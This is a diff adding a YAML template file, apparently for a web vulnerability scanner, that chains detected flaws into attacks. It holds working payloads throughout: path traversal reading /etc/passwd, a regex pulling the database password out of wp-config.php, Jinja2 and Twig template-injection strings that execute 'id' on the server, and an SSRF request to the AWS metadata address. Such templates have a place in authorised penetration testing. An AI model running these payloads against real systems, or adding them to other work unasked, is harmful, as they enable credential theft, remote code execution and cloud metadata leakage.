@@ -1,0 +1,47 @@
+- id: lfi-to-secret
+  description: "Exfiltrate secrets if LFI is detected"
+  condition:
+    - "lfi"
+    - "traversal"
+  steps:
+    - method: GET
+      path: "/../../../../../../../../../etc/passwd"
+      extract:
+        name: "passwd_content"
+        type: regex
+        regex: 
+          - "root:.*:0:0"
+    - method: GET
+      path: "/wp-config.php"
+      extract:
+        name: "db_password"
+        type: regex
+        regex:
+          - "DB_PASSWORD', '([^']+)'"
+
+- id: ssti-to-rce
+  description: "Escalate SSTI to Remote Code Execution"
+  condition:
+    - "ssti"
+  steps:
+    - method: GET
+      path: "?debug={{self._TemplateReference__context.namespace.cycler.__init__.__globals__.os.popen('id').read()}}"
+      matchers:
+        - type: word
+          words: ["uid="]
+    - method: GET
+      path: "?test={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      matchers:
+        - type: word
+          words: ["uid="]
+
+- id: ssrf-to-cloud-metadata
+  description: "Chain SSRF to leak AWS/Cloud metadata"
+  condition:
+    - "ssrf"
+  steps:
+    - method: GET
+      path: "http://169.254.169.254/latest/meta-data/"
+      matchers:
+        - type: word
+          words: ["ami-id", "instance-id"]
